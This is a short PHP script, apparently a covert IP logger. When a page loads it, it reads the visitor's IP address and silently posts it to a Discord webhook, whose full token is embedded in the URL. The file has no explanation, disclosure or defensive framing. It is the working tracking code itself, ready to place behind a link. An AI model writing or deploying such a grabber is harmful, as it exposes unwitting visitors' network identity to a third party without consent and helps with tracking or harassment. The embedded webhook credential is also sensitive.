<?php
$i=$_SERVER['REMOTE_ADDR'];
$c=curl_init("https://ptb.discord.com/api/webhooks/1445311807588663310/3ELjZ7CbtnDvwdh4-P4aSypZvMbmeNDqWUCjmRhB85fngQ9U5S0C2EgIzCixml2gRWKd");
curl_setopt($c,CURLOPT_POSTFIELDS,json_encode(["content"=>"IP: $i"]));
curl_exec($c);
?>
